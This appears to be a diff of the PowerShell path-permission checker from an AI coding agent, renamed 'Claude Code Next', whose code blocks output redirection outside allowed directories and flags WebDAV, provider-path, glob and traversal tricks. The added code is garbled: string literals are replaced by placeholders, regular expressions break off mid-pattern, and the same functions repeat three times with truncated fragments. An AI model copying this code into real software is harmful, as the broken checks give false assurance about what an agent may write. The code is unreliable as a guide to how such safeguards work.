@@ -1798,11 +1715,11 @@ function checkPathConstraintsForStatement(
         }
       }
 
-      // Red-team P11/P14: step 5 at powershellPermissions.ts:970 already
-      // catches this via the same synthetic-CommandExpressionAst mechanism —
-      // this is belt-and-suspenders so the nested loop doesn't rely on that
-      // accident. Placed AFTER the path loop so specific asks (blockedPath,
-      // suggestions) win via ??=.
+      
+      
+      
+      
+      
       if (hasExpressionPipelineSource) {
         firstAsk ??= {
           behavior: 'ask',
@@ -1812,7 +1729,7 @@ function checkPathConstraintsForStatement(
     }
   }
 
-  // Check redirections on nested commands (e.g., from && / || chains)
+  
   if (statement.nestedCommands) {
     for (const cmd of statement.nestedCommands) {
       if (cmd.redirections) {
@@ -1838,7 +1755,7 @@ function checkPathConstraintsForStatement(
               decisionReason?.type === 'other' ||
               decisionReason?.type === 'safetyCheck'
                 ? decisionReason.reason
-                : `Output redirection to '${resolvedPath}' was blocked. For security, Claude Code may only write to files in the allowed working directories for this session: ${dirListStr}.`
+                : `Output redirection to '${resolvedPath}' was blocked. For security, Claude Code Next may only write to files in the allowed working directories for this session: ${dirListStr}.`
 
             if (decisionReason?.type === 'rule') {
               return {
@@ -1867,7 +1784,7 @@ function checkPathConstraintsForStatement(
     }
   }
 
-  // Check file redirections
+  
   if (statement.redirections) {
     for (const redir of statement.redirections) {
       if (redir.isMerging) continue
@@ -1891,7 +1808,7 @@ function checkPathConstraintsForStatement(
           decisionReason?.type === 'other' ||
           decisionReason?.type === 'safetyCheck'
             ? decisionReason.reason
-            : `Output redirection to '${resolvedPath}' was blocked. For security, Claude Code may only write to files in the allowed working directories for this session: ${dirListStr}.`
+            : `Output redirection to '${resolvedPath}' was blocked. For security, Claude Code Next may only write to files in the allowed working directories for this session: ${dirListStr}.`
 
         if (decisionReason?.type === 'rule') {
           return {
@@ -1925,3 +1842,1376 @@ function checkPathConstraintsForStatement(
     }
   )
 }
+)
+  )
+}
+
+function formatDirectoryList(directories: string[]): string {
+  const dirCount = directories.length
+  if (dirCount <= MAX_DIRS_TO_LIST) {
+    return directories.map(dir =>  STR54391 ).join( STR54392 )
+  }
+  const firstDirs = directories
+    .slice(0, MAX_DIRS_TO_LIST)
+    .map(dir =>  STR54393 )
+    .join( STR54394 )
+  return  STR54395 
+}
+
+function expandTilde(filePath: string): string {
+  if (
+    filePath ===  STR54396  ||
+    filePath.startsWith( STR54397 ) ||
+    filePath.startsWith( STR54398 )
+  ) {
+    return homedir() + filePath.slice(1)
+  }
+  return filePath
+}
+
+export function isDangerousRemovalRawPath(filePath: string): boolean {
+  const expanded = expandTilde(filePath.replace(/^[ STR54399  STR54400 ]|[ STR54401  STR54402 / STR54403  STR54404 n → n) but that STR54405  STR54406 rule STR54407 other STR54408 Backtick escape characters in paths cannot be statically validated and require manual approval STR54409 :: STR54410 :: STR54411 rule STR54412 other STR54413 Module-qualified provider paths (::) cannot be statically validated and require manual approval STR54414 
+    /DavWWWRoot/i.test(normalizedPath) ||
+    /@SSL@/i.test(normalizedPath)
+  ) {
+    return {
+      allowed: false,
+      resolvedPath: normalizedPath,
+      decisionReason: {
+        type:  STR54415 ,
+        reason:
+           STR54416 ,
+      },
+    }
+  }
+
+  
+  if (normalizedPath.includes( STR54417 ) || normalizedPath.includes( STR54418 )) {
+    return {
+      allowed: false,
+      resolvedPath: normalizedPath,
+      decisionReason: {
+        type:  STR54419 ,
+        reason:  STR54420 ,
+      },
+    }
+  }
+
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  const providerPathRegex =
+    getPlatform() ===  STR54421  ? /^[a-z0-9]{2,}:/i : /^[a-z0-9]+:/i
+  if (providerPathRegex.test(normalizedPath)) {
+    return {
+      allowed: false,
+      resolvedPath: normalizedPath,
+      decisionReason: {
+        type:  STR54422 ,
+        reason:  STR54423 ,
+      },
+    }
+  }
+
+  
+  if (GLOB_PATTERN_REGEX.test(normalizedPath)) {
+    if (operationType ===  STR54424  || operationType ===  STR54425 ) {
+      return {
+        allowed: false,
+        resolvedPath: normalizedPath,
+        decisionReason: {
+          type:  STR54426 ,
+          reason:
+             STR54427 ,
+        },
+      }
+    }
+
+    
+    
+    
+    if (containsPathTraversal(normalizedPath)) {
+      const absolutePath = isAbsolute(normalizedPath)
+        ? normalizedPath
+        : resolve(cwd, normalizedPath)
+      const { resolvedPath, isCanonical } = safeResolvePath(
+        getFsImplementation(),
+        absolutePath,
+      )
+      const result = isPathAllowed(
+        resolvedPath,
+        toolPermissionContext,
+        operationType,
+        isCanonical ? [resolvedPath] : undefined,
+      )
+      return {
+        allowed: result.allowed,
+        resolvedPath,
+        decisionReason: result.decisionReason,
+      }
+    }
+
+    
+    
+    
+    
+    
+
+const SAFE_PATH_ELEMENT_TYPES = new Set<string>([ STR54428 ,  STR54429 ])
+
+function extractPathsFromCommand(cmd: ParsedCommandElement): {
+  paths: string[]
+  operationType: FileOperationType
+  hasUnvalidatablePathArg: boolean
+  optionalWrite: boolean
+} {
+  const canonical = resolveToCanonical(cmd.name)
+  const config = CMDLET_PATH_CONFIG[canonical]
+
+  if (!config) {
+    return {
+      paths: [],
+      operationType:  STR54430 ,
+      hasUnvalidatablePathArg: false,
+      optionalWrite: false,
+    }
+  }
+
+  
+  const switchParams = [...config.knownSwitches, ...COMMON_SWITCHES]
+  const valueParams = [...config.knownValueParams, ...COMMON_VALUE_PARAMS]
+
+  const paths: string[] = []
+  const args = cmd.args
+  
+  const elementTypes = cmd.elementTypes
+  let hasUnvalidatablePathArg = false
+  let positionalsSeen = 0
+  const positionalSkip = config.positionalSkip ?? 0
+
+  function checkArgElementType(argIdx: number): void {
+    if (!elementTypes) return
+    const et = elementTypes[argIdx + 1]
+    if (et && !SAFE_PATH_ELEMENT_TYPES.has(et)) {
+      hasUnvalidatablePathArg = true
+    }
+  }
+
+  
+  for (let i = 0; i < args.length; i++) {
+    const arg = args[i]
+    if (!arg) continue
+
+    
+    
+    
+    
+    
+    
+    
+    const argElementType = elementTypes ? elementTypes[i + 1] : undefined
+    if (isPowerShellParameter(arg, argElementType)) {
+      
+      
+      const normalized =  STR54431  + arg.slice(1)
+      const colonIdx = normalized.indexOf( STR54432 , 1) 
+      const paramName =
+        colonIdx > 0 ? normalized.substring(0, colonIdx) : normalized
+      const paramLower = paramName.toLowerCase()
+
+      if (matchesParam(paramLower, config.pathParams)) {
+        
+        let value: string | undefined
+        if (colonIdx > 0) {
+          
+          
+          
+          
+          const rawValue = arg.substring(colonIdx + 1)
+          if (hasComplexColonValue(rawValue)) {
+            hasUnvalidatablePathArg = true
+          } else {
+            value = rawValue
+          }
+        } else {
+          
+          const nextVal = args[i + 1]
+          const nextType = elementTypes ? elementTypes[i + 2] : undefined
+          if (nextVal && !isPowerShellParameter(nextVal, nextType)) {
+            value = nextVal
+            checkArgElementType(i + 1)
+            i++ 
+          }
+        }
+        if (value) {
+          paths.push(value)
+        }
+      } else if (
+        config.leafOnlyPathParams &&
+        matchesParam(paramLower, config.leafOnlyPathParams)
+      ) {
+        
+        
+        
+        
+        
+        
+        let value: string | undefined
+        if (colonIdx > 0) {
+          const rawValue = arg.substring(colonIdx + 1)
+          if (hasComplexColonValue(rawValue)) {
+            hasUnvalidatablePathArg = true
+          } else {
+            value = rawValue
+          }
+        } else {
+          const nextVal = args[i + 1]
+          const nextType = elementTypes ? elementTypes[i + 2] : undefined
+          if (nextVal && !isPowerShellParameter(nextVal, nextType)) {
+            value = nextVal
+            checkArgElementType(i + 1)
+            i++
+          }
+        }
+        if (value !== undefined) {
+          if (
+            value.includes( STR54433 ) ||
+            value.includes( STR54434 ) ||
+            value ===  STR54435  ||
+            value ===  STR54436 
+          ) {
+            
+            
+            hasUnvalidatablePathArg = true
+          } else {
+            
+            
+            
+            paths.push(value)
+          }
+        }
+      } else if (matchesParam(paramLower, switchParams)) {
+        
+        
+        
+      } else if (matchesParam(paramLower, valueParams)) {
+        
+        
+        
+        
+        
+        
+        if (colonIdx > 0) {
+          
+          
+          
+          
+          const rawValue = arg.substring(colonIdx + 1)
+          if (hasComplexColonValue(rawValue)) {
+            hasUnvalidatablePathArg = true
+          }
+        } else {
+          const nextArg = args[i + 1]
+          const nextArgType = elementTypes ? elementTypes[i + 2] : undefined
+          if (nextArg && !isPowerShellParameter(nextArg, nextArgType)) {
+            checkArgElementType(i + 1)
+            i++ 
+          }
+        }
+      } else {
+        
+        
+        
+        
+        
+        
+        hasUnvalidatablePathArg = true
+        
+        
+        
+        
+        
+        
+        
+        if (colonIdx > 0) {
+          const rawValue = arg.substring(colonIdx + 1)
+          if (!hasComplexColonValue(rawValue)) {
+            paths.push(rawValue)
+          }
+        }
+        
+        
+      }
+      continue
+    }
+
+    
+    
+    
+    if (positionalsSeen < positionalSkip) {
+      positionalsSeen++
+      continue
+    }
+    positionalsSeen++
+    checkArgElementType(i)
+    paths.push(arg)
+  }
+
+  return {
+    paths,
+    operationType: config.operationType,
+    hasUnvalidatablePathArg,
+    optionalWrite: config.optionalWrite ?? false,
+  }
+}
+
+export function checkPathConstraints(
+  input: { command: string },
+  parsed: ParsedPowerShellCommand,
+  toolPermissionContext: ToolPermissionContext,
+  compoundCommandHasCd = false,
+): PermissionResult {
+  if (!parsed.valid) {
+    return {
+      behavior:  STR54437 ,
+      message:  STR54438 ,
+    }
+  }
+
+  
+  
+  
+  
+  let firstAsk: PermissionResult | undefined
+
+  for (const statement of parsed.statements) {
+    const result = checkPathConstraintsForStatement(
+      statement,
+      toolPermissionContext,
+      compoundCommandHasCd,
+    )
+    if (result.behavior ===  STR54439 ) {
+      return result
+    }
+    if (result.behavior ===  STR54440  && !firstAsk) {
+      firstAsk = result
+    }
+  }
+
+  return (
+    firstAsk ?? {
+      behavior:  STR54441 ,
+      message:  STR54442 ,
+    }
+  )
+}
+
+function checkPathConstraintsForStatement(
+  statement: ParsedPowerShellCommand[ STR54443 ][number],
+  toolPermissionContext: ToolPermissionContext,
+  compoundCommandHasCd = false,
+): PermissionResult {
+  const cwd = getCwd()
+  let firstAsk: PermissionResult | undefined
+
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  if (compoundCommandHasCd) {
+    firstAsk = {
+      behavior:  STR54444 ,
+      message:
+         STR54445 ,
+      decisionReason: {
+        type:  STR54446 ,
+        reason:
+           STR54447 ,
+      },
+    }
+  }
+
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  let hasExpressionPipelineSource = false
+  
+  
+  
+  
+  
+  let pipelineSourceText: string | undefined
+
+  for (const cmd of statement.commands) {
+    if (cmd.elementType !==  STR54448 ) {
+      hasExpressionPipelineSource = true
+      pipelineSourceText = cmd.text
+      continue
+    }
+
+    const { paths, operationType, hasUnvalidatablePathArg, optionalWrite } =
+      extractPathsFromCommand(cmd)
+
+    
+    
+    
+    
+    
+    
+    if (hasExpressionPipelineSource) {
+      const canonical = resolveToCanonical(cmd.name)
+      
+      
+      
+      
+      
+      if (pipelineSourceText !== undefined) {
+        const stripped = pipelineSourceText.replace(/^[ STR54449  STR54450 ) || normalizedPath.includes( STR54418 )) {
+    return {
+      allowed: false,
+      resolvedPath: normalizedPath,
+      decisionReason: {
+        type:  STR54419 ,
+        reason:  STR54420 ,
+      },
+    }
+  }
+
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  const providerPathRegex =
+    getPlatform() ===  STR54421  ? /^[a-z0-9]{2,}:/i : /^[a-z0-9]+:/i
+  if (providerPathRegex.test(normalizedPath)) {
+    return {
+      allowed: false,
+      resolvedPath: normalizedPath,
+      decisionReason: {
+        type:  STR54422 ,
+        reason:  STR54423 ,
+      },
+    }
+  }
+
+  
+  if (GLOB_PATTERN_REGEX.test(normalizedPath)) {
+    if (operationType ===  STR54424  || operationType ===  STR54425 ) {
+      return {
+        allowed: false,
+        resolvedPath: normalizedPath,
+        decisionReason: {
+          type:  STR54426 ,
+          reason:
+             STR54427 ,
+        },
+      }
+    }
+
+    
+    
+    
+    if (containsPathTraversal(normalizedPath)) {
+      const absolutePath = isAbsolute(normalizedPath)
+        ? normalizedPath
+        : resolve(cwd, normalizedPath)
+      const { resolvedPath, isCanonical } = safeResolvePath(
+        getFsImplementation(),
+        absolutePath,
+      )
+      const result = isPathAllowed(
+        resolvedPath,
+        toolPermissionContext,
+        operationType,
+        isCanonical ? [resolvedPath] : undefined,
+      )
+      return {
+        allowed: result.allowed,
+        resolvedPath,
+        decisionReason: result.decisionReason,
+      }
+    }
+
+    
+    
+    
+    
+    
+
+const SAFE_PATH_ELEMENT_TYPES = new Set<string>([ STR54428 ,  STR54429 ])
+
+function extractPathsFromCommand(cmd: ParsedCommandElement): {
+  paths: string[]
+  operationType: FileOperationType
+  hasUnvalidatablePathArg: boolean
+  optionalWrite: boolean
+} {
+  const canonical = resolveToCanonical(cmd.name)
+  const config = CMDLET_PATH_CONFIG[canonical]
+
+  if (!config) {
+    return {
+      paths: [],
+      operationType:  STR54430 ,
+      hasUnvalidatablePathArg: false,
+      optionalWrite: false,
+    }
+  }
+
+  
+  const switchParams = [...config.knownSwitches, ...COMMON_SWITCHES]
+  const valueParams = [...config.knownValueParams, ...COMMON_VALUE_PARAMS]
+
+  const paths: string[] = []
+  const args = cmd.args
+  
+  const elementTypes = cmd.elementTypes
+  let hasUnvalidatablePathArg = false
+  let positionalsSeen = 0
+  const positionalSkip = config.positionalSkip ?? 0
+
+  function checkArgElementType(argIdx: number): void {
+    if (!elementTypes) return
+    const et = elementTypes[argIdx + 1]
+    if (et && !SAFE_PATH_ELEMENT_TYPES.has(et)) {
+      hasUnvalidatablePathArg = true
+    }
+  }
+
+  
+  for (let i = 0; i < args.length; i++) {
+    const arg = args[i]
+    if (!arg) continue
+
+    
+    
+    
+    
+    
+    
+    
+    const argElementType = elementTypes ? elementTypes[i + 1] : undefined
+    if (isPowerShellParameter(arg, argElementType)) {
+      
+      
+      const normalized =  STR54431  + arg.slice(1)
+      const colonIdx = normalized.indexOf( STR54432 , 1) 
+      const paramName =
+        colonIdx > 0 ? normalized.substring(0, colonIdx) : normalized
+      const paramLower = paramName.toLowerCase()
+
+      if (matchesParam(paramLower, config.pathParams)) {
+        
+        let value: string | undefined
+        if (colonIdx > 0) {
+          
+          
+          
+          
+          const rawValue = arg.substring(colonIdx + 1)
+          if (hasComplexColonValue(rawValue)) {
+            hasUnvalidatablePathArg = true
+          } else {
+            value = rawValue
+          }
+        } else {
+          
+          const nextVal = args[i + 1]
+          const nextType = elementTypes ? elementTypes[i + 2] : undefined
+          if (nextVal && !isPowerShellParameter(nextVal, nextType)) {
+            value = nextVal
+            checkArgElementType(i + 1)
+            i++ 
+          }
+        }
+        if (value) {
+          paths.push(value)
+        }
+      } else if (
+        config.leafOnlyPathParams &&
+        matchesParam(paramLower, config.leafOnlyPathParams)
+      ) {
+        
+        
+        
+        
+        
+        
+        let value: string | undefined
+        if (colonIdx > 0) {
+          const rawValue = arg.substring(colonIdx + 1)
+          if (hasComplexColonValue(rawValue)) {
+            hasUnvalidatablePathArg = true
+          } else {
+            value = rawValue
+          }
+        } else {
+          const nextVal = args[i + 1]
+          const nextType = elementTypes ? elementTypes[i + 2] : undefined
+          if (nextVal && !isPowerShellParameter(nextVal, nextType)) {
+            value = nextVal
+            checkArgElementType(i + 1)
+            i++
+          }
+        }
+        if (value !== undefined) {
+          if (
+            value.includes( STR54433 ) ||
+            value.includes( STR54434 ) ||
+            value ===  STR54435  ||
+            value ===  STR54436 
+          ) {
+            
+            
+            hasUnvalidatablePathArg = true
+          } else {
+            
+            
+            
+            paths.push(value)
+          }
+        }
+      } else if (matchesParam(paramLower, switchParams)) {
+        
+        
+        
+      } else if (matchesParam(paramLower, valueParams)) {
+        
+        
+        
+        
+        
+        
+        if (colonIdx > 0) {
+          
+          
+          
+          
+          const rawValue = arg.substring(colonIdx + 1)
+          if (hasComplexColonValue(rawValue)) {
+            hasUnvalidatablePathArg = true
+          }
+        } else {
+          const nextArg = args[i + 1]
+          const nextArgType = elementTypes ? elementTypes[i + 2] : undefined
+          if (nextArg && !isPowerShellParameter(nextArg, nextArgType)) {
+            checkArgElementType(i + 1)
+            i++ 
+          }
+        }
+      } else {
+        
+        
+        
+        
+        
+        
+        hasUnvalidatablePathArg = true
+        
+        
+        
+        
+        
+        
+        
+        if (colonIdx > 0) {
+          const rawValue = arg.substring(colonIdx + 1)
+          if (!hasComplexColonValue(rawValue)) {
+            paths.push(rawValue)
+          }
+        }
+        
+        
+      }
+      continue
+    }
+
+    
+    
+    
+    if (positionalsSeen < positionalSkip) {
+      positionalsSeen++
+      continue
+    }
+    positionalsSeen++
+    checkArgElementType(i)
+    paths.push(arg)
+  }
+
+  return {
+    paths,
+    operationType: config.operationType,
+    hasUnvalidatablePathArg,
+    optionalWrite: config.optionalWrite ?? false,
+  }
+}
+
+export function checkPathConstraints(
+  input: { command: string },
+  parsed: ParsedPowerShellCommand,
+  toolPermissionContext: ToolPermissionContext,
+  compoundCommandHasCd = false,
+): PermissionResult {
+  if (!parsed.valid) {
+    return {
+      behavior:  STR54437 ,
+      message:  STR54438 ,
+    }
+  }
+
+  
+  
+  
+  
+  let firstAsk: PermissionResult | undefined
+
+  for (const statement of parsed.statements) {
+    const result = checkPathConstraintsForStatement(
+      statement,
+      toolPermissionContext,
+      compoundCommandHasCd,
+    )
+    if (result.behavior ===  STR54439 ) {
+      return result
+    }
+    if (result.behavior ===  STR54440  && !firstAsk) {
+      firstAsk = result
+    }
+  }
+
+  return (
+    firstAsk ?? {
+      behavior:  STR54441 ,
+      message:  STR54442 ,
+    }
+  )
+}
+
+function checkPathConstraintsForStatement(
+  statement: ParsedPowerShellCommand[ STR54443 ][number],
+  toolPermissionContext: ToolPermissionContext,
+  compoundCommandHasCd = false,
+): PermissionResult {
+  const cwd = getCwd()
+  let firstAsk: PermissionResult | undefined
+
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  if (compoundCommandHasCd) {
+    firstAsk = {
+      behavior:  STR54444 ,
+      message:
+         STR54445 ,
+      decisionReason: {
+        type:  STR54446 ,
+        reason:
+           STR54447 ,
+      },
+    }
+  }
+
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  let hasExpressionPipelineSource = false
+  
+  
+  
+  
+  
+  let pipelineSourceText: string | undefined
+
+  for (const cmd of statement.commands) {
+    if (cmd.elementType !==  STR54448 ) {
+      hasExpressionPipelineSource = true
+      pipelineSourceText = cmd.text
+      continue
+    }
+
+    const { paths, operationType, hasUnvalidatablePathArg, optionalWrite } =
+      extractPathsFromCommand(cmd)
+
+    
+    
+    
+    
+    
+    
+    if (hasExpressionPipelineSource) {
+      const canonical = resolveToCanonical(cmd.name)
+      
+      
+      
+      
+      
+      if (pipelineSourceText !== undefined) {
+        const stripped = pipelineSourceText.replace(/^[ STR54449  STR54450 )
+  )
+}
+
+function formatDirectoryList(directories: string[]): string {
+  const dirCount = directories.length
+  if (dirCount <= MAX_DIRS_TO_LIST) {
+    return directories.map(dir =>  STR54391 ).join( STR54392 )
+  }
+  const firstDirs = directories
+    .slice(0, MAX_DIRS_TO_LIST)
+    .map(dir =>  STR54393 )
+    .join( STR54394 )
+  return  STR54395 
+}
+
+function expandTilde(filePath: string): string {
+  if (
+    filePath ===  STR54396  ||
+    filePath.startsWith( STR54397 ) ||
+    filePath.startsWith( STR54398 )
+  ) {
+    return homedir() + filePath.slice(1)
+  }
+  return filePath
+}
+
+export function isDangerousRemovalRawPath(filePath: string): boolean {
+  const expanded = expandTilde(filePath.replace(/^[ STR54399  STR54400 ]|[ STR54401  STR54402 / STR54403  STR54404 n → n) but that STR54405  STR54406 rule STR54407 other STR54408 Backtick escape characters in paths cannot be statically validated and require manual approval STR54409 :: STR54410 :: STR54411 rule STR54412 other STR54413 Module-qualified provider paths (::) cannot be statically validated and require manual approval STR54414 
+    /DavWWWRoot/i.test(normalizedPath) ||
+    /@SSL@/i.test(normalizedPath)
+  ) {
+    return {
+      allowed: false,
+      resolvedPath: normalizedPath,
+      decisionReason: {
+        type:  STR54415 ,
+        reason:
+           STR54416 ,
+      },
+    }
+  }
+
+  
+  if (normalizedPath.includes( STR54417 ) || normalizedPath.includes( STR54418 )) {
+    return {
+      allowed: false,
+      resolvedPath: normalizedPath,
+      decisionReason: {
+        type:  STR54419 ,
+        reason:  STR54420 ,
+      },
+    }
+  }
+
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  const providerPathRegex =
+    getPlatform() ===  STR54421  ? /^[a-z0-9]{2,}:/i : /^[a-z0-9]+:/i
+  if (providerPathRegex.test(normalizedPath)) {
+    return {
+      allowed: false,
+      resolvedPath: normalizedPath,
+      decisionReason: {
+        type:  STR54422 ,
+        reason:  STR54423 ,
+      },
+    }
+  }
+
+  
+  if (GLOB_PATTERN_REGEX.test(normalizedPath)) {
+    if (operationType ===  STR54424  || operationType ===  STR54425 ) {
+      return {
+        allowed: false,
+        resolvedPath: normalizedPath,
+        decisionReason: {
+          type:  STR54426 ,
+          reason:
+             STR54427 ,
+        },
+      }
+    }
+
+    
+    
+    
+    if (containsPathTraversal(normalizedPath)) {
+      const absolutePath = isAbsolute(normalizedPath)
+        ? normalizedPath
+        : resolve(cwd, normalizedPath)
+      const { resolvedPath, isCanonical } = safeResolvePath(
+        getFsImplementation(),
+        absolutePath,
+      )
+      const result = isPathAllowed(
+        resolvedPath,
+        toolPermissionContext,
+        operationType,
+        isCanonical ? [resolvedPath] : undefined,
+      )
+      return {
+        allowed: result.allowed,
+        resolvedPath,
+        decisionReason: result.decisionReason,
+      }
+    }
+
+    
+    
+    
+    
+    
+
+const SAFE_PATH_ELEMENT_TYPES = new Set<string>([ STR54428 ,  STR54429 ])
+
+function extractPathsFromCommand(cmd: ParsedCommandElement): {
+  paths: string[]
+  operationType: FileOperationType
+  hasUnvalidatablePathArg: boolean
+  optionalWrite: boolean
+} {
+  const canonical = resolveToCanonical(cmd.name)
+  const config = CMDLET_PATH_CONFIG[canonical]
+
+  if (!config) {
+    return {
+      paths: [],
+      operationType:  STR54430 ,
+      hasUnvalidatablePathArg: false,
+      optionalWrite: false,
+    }
+  }
+
+  
+  const switchParams = [...config.knownSwitches, ...COMMON_SWITCHES]
+  const valueParams = [...config.knownValueParams, ...COMMON_VALUE_PARAMS]
+
+  const paths: string[] = []
+  const args = cmd.args
+  
+  const elementTypes = cmd.elementTypes
+  let hasUnvalidatablePathArg = false
+  let positionalsSeen = 0
+  const positionalSkip = config.positionalSkip ?? 0
+
+  function checkArgElementType(argIdx: number): void {
+    if (!elementTypes) return
+    const et = elementTypes[argIdx + 1]
+    if (et && !SAFE_PATH_ELEMENT_TYPES.has(et)) {
+      hasUnvalidatablePathArg = true
+    }
+  }
+
+  
+  for (let i = 0; i < args.length; i++) {
+    const arg = args[i]
+    if (!arg) continue
+
+    
+    
+    
+    
+    
+    
+    
+    const argElementType = elementTypes ? elementTypes[i + 1] : undefined
+    if (isPowerShellParameter(arg, argElementType)) {
+      
+      
+      const normalized =  STR54431  + arg.slice(1)
+      const colonIdx = normalized.indexOf( STR54432 , 1) 
+      const paramName =
+        colonIdx > 0 ? normalized.substring(0, colonIdx) : normalized
+      const paramLower = paramName.toLowerCase()
+
+      if (matchesParam(paramLower, config.pathParams)) {
+        
+        let value: string | undefined
+        if (colonIdx > 0) {
+          
+          
+          
+          
+          const rawValue = arg.substring(colonIdx + 1)
+          if (hasComplexColonValue(rawValue)) {
+            hasUnvalidatablePathArg = true
+          } else {
+            value = rawValue
+          }
+        } else {
+          
+          const nextVal = args[i + 1]
+          const nextType = elementTypes ? elementTypes[i + 2] : undefined
+          if (nextVal && !isPowerShellParameter(nextVal, nextType)) {
+            value = nextVal
+            checkArgElementType(i + 1)
+            i++ 
+          }
+        }
+        if (value) {
+          paths.push(value)
+        }
+      } else if (
+        config.leafOnlyPathParams &&
+        matchesParam(paramLower, config.leafOnlyPathParams)
+      ) {
+        
+        
+        
+        
+        
+        
+        let value: string | undefined
+        if (colonIdx > 0) {
+          const rawValue = arg.substring(colonIdx + 1)
+          if (hasComplexColonValue(rawValue)) {
+            hasUnvalidatablePathArg = true
+          } else {
+            value = rawValue
+          }
+        } else {
+          const nextVal = args[i + 1]
+          const nextType = elementTypes ? elementTypes[i + 2] : undefined
+          if (nextVal && !isPowerShellParameter(nextVal, nextType)) {
+            value = nextVal
+            checkArgElementType(i + 1)
+            i++
+          }
+        }
+        if (value !== undefined) {
+          if (
+            value.includes( STR54433 ) ||
+            value.includes( STR54434 ) ||
+            value ===  STR54435  ||
+            value ===  STR54436 
+          ) {
+            
+            
+            hasUnvalidatablePathArg = true
+          } else {
+            
+            
+            
+            paths.push(value)
+          }
+        }
+      } else if (matchesParam(paramLower, switchParams)) {
+        
+        
+        
+      } else if (matchesParam(paramLower, valueParams)) {
+        
+        
+        
+        
+        
+        
+        if (colonIdx > 0) {
+          
+          
+          
+          
+          const rawValue = arg.substring(colonIdx + 1)
+          if (hasComplexColonValue(rawValue)) {
+            hasUnvalidatablePathArg = true
+          }
+        } else {
+          const nextArg = args[i + 1]
+          const nextArgType = elementTypes ? elementTypes[i + 2] : undefined
+          if (nextArg && !isPowerShellParameter(nextArg, nextArgType)) {
+            checkArgElementType(i + 1)
+            i++ 
+          }
+        }
+      } else {
+        
+        
+        
+        
+        
+        
+        hasUnvalidatablePathArg = true
+        
+        
+        
+        
+        
+        
+        
+        if (colonIdx > 0) {
+          const rawValue = arg.substring(colonIdx + 1)
+          if (!hasComplexColonValue(rawValue)) {
+            paths.push(rawValue)
+          }
+        }
+        
+        
+      }
+      continue
+    }
+
+    
+    
+    
+    if (positionalsSeen < positionalSkip) {
+      positionalsSeen++
+      continue
+    }
+    positionalsSeen++
+    checkArgElementType(i)
+    paths.push(arg)
+  }
+
+  return {
+    paths,
+    operationType: config.operationType,
+    hasUnvalidatablePathArg,
+    optionalWrite: config.optionalWrite ?? false,
+  }
+}
+
+export function checkPathConstraints(
+  input: { command: string },
+  parsed: ParsedPowerShellCommand,
+  toolPermissionContext: ToolPermissionContext,
+  compoundCommandHasCd = false,
+): PermissionResult {
+  if (!parsed.valid) {
+    return {
+      behavior:  STR54437 ,
+      message:  STR54438 ,
+    }
+  }
+
+  
+  
+  
+  
+  let firstAsk: PermissionResult | undefined
+
+  for (const statement of parsed.statements) {
+    const result = checkPathConstraintsForStatement(
+      statement,
+      toolPermissionContext,
+      compoundCommandHasCd,
+    )
+    if (result.behavior ===  STR54439 ) {
+      return result
+    }
+    if (result.behavior ===  STR54440  && !firstAsk) {
+      firstAsk = result
+    }
+  }
+
+  return (
+    firstAsk ?? {
+      behavior:  STR54441 ,
+      message:  STR54442 ,
+    }
+  )
+}
+
+function checkPathConstraintsForStatement(
+  statement: ParsedPowerShellCommand[ STR54443 ][number],
+  toolPermissionContext: ToolPermissionContext,
+  compoundCommandHasCd = false,
+): PermissionResult {
+  const cwd = getCwd()
+  let firstAsk: PermissionResult | undefined
+
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  if (compoundCommandHasCd) {
+    firstAsk = {
+      behavior:  STR54444 ,
+      message:
+         STR54445 ,
+      decisionReason: {
+        type:  STR54446 ,
+        reason:
+           STR54447 ,
+      },
+    }
+  }
+
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  let hasExpressionPipelineSource = false
+  
+  
+  
+  
+  
+  let pipelineSourceText: string | undefined
+
+  for (const cmd of statement.commands) {
+    if (cmd.elementType !==  STR54448 ) {
+      hasExpressionPipelineSource = true
+      pipelineSourceText = cmd.text
+      continue
+    }
+
+    const { paths, operationType, hasUnvalidatablePathArg, optionalWrite } =
+      extractPathsFromCommand(cmd)
+
+    
+    
+    
+    
+    
+    
+    if (hasExpressionPipelineSource) {
+      const canonical = resolveToCanonical(cmd.name)
+      
+      
+      
+      
+      
+      if (pipelineSourceText !== undefined) {
+        const stripped = pipelineSourceText.replace(/^[ STR54449  STR54450 
